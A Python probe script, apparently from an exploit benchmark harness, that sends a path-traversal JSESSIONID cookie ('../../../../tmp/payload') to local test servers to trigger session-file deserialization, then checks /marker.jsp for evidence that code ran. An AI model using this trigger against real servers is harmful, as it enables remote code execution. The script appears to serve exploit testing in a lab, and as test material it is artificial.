#!/usr/bin/env python3
"""HTTP probe: Cookie JSESSIONID -> FileStore.load deserialization -> GET /marker.jsp.

Usage: python3 seed_exec.py <candidate.json> [version]
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
import time

BASE = {
    "v0": "http://127.0.0.1:39480",
    "v1": "http://127.0.0.1:39481",
    "v2": "http://127.0.0.1:39482",
}


def _base_url(version: str) -> str:
    port = os.environ.get("PCB_TARGET_PORT")
    if port:
        return f"http://127.0.0.1:{int(port)}"
    pbt = os.environ.get("PCB_TARGET_BASE")
    if pbt:
        return pbt.rstrip("/")
    return BASE[version]


def _curl(url: str, cookie: str | None = None):
    cmd = ["curl", "-sS", "-m", "15", "-w", "\n%{http_code}", url]
    if cookie:
        cmd[1:1] = ["-H", f"Cookie: {cookie}"]
    proc = subprocess.run(cmd, text=True, capture_output=True, check=False)
    out = proc.stdout or ""
    status = ""
    body = out
    if "\n" in out:
        body, status = out.rsplit("\n", 1)
    err = (proc.stderr or "").strip()
    return proc.returncode, status.strip(), body, err


def run_probe(candidate, *, version="v1"):
    base = _base_url(version)
    if isinstance(candidate, dict):
        jsid = candidate.get("jsessionid") or candidate.get("path") or ""
    else:
        jsid = str(candidate)
    jsid = (jsid or "../../../../tmp/payload").strip()
    cookie = f"JSESSIONID={jsid}"
    rc, status, body, err = _curl(f"{base}/index.html", cookie=cookie)
    time.sleep(1)
    rc2, status2, marker, err2 = _curl(f"{base}/marker.jsp")
    result = {
        "version": version,
        "jsessionid": jsid,
        "trigger_status": status,
        "status": status2,
        "body": (marker or "").strip(),
    }
    if rc != 0 and err:
        result["trigger_error"] = err
    if rc2 != 0:
        result["error"] = err2 or f"curl rc={rc2}"
    return result


if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    print(json.dumps(run_probe(cand, version=version), default=str))
